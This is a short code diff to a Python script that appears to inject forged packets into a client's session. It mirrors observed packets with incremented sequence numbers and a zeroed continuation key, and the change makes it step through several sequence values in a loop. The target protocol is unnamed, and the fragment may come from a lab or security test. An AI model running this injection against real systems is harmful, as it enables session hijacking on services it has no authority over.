@@ -53,15 +53,18 @@ def main():
                 if hx in injected_hexes:
                     continue  # our own injection echoing back — never mirror it
                 pkt = bytes.fromhex(hx)
-                new_seq = (pkt[2] + 1) & 0xFF or 1
-                # continuation key is 0 (token from the client's walk is single-use,
-                # already spent — reusing it gets rejected)
-                mirror = bytes([pkt[0], pkt[1], new_seq]) + b"\x00\x00\x00\x00"
                 print(f"CLIENT {hx}", flush=True)
                 time.sleep(DELAY)
-                resp = send(sock, mirror)
-                injected_hexes.add(mirror.hex())
-                print(f"INJECT {mirror.hex()} -> {resp}", flush=True)
+                seq = pkt[2]
+                for _ in range(STEPS):
+                    seq = (seq + 1) & 0xFF or 1
+                    # continuation key 0: the token from the client's walk is
+                    # single-use, already spent — reusing it gets rejected
+                    mirror = bytes([pkt[0], pkt[1], seq]) + b"\x00\x00\x00\x00"
+                    resp = send(sock, mirror)
+                    injected_hexes.add(mirror.hex())
+                    print(f"INJECT {mirror.hex()} -> {resp}", flush=True)
+                    time.sleep(DELAY)
         time.sleep(0.15)
 
 
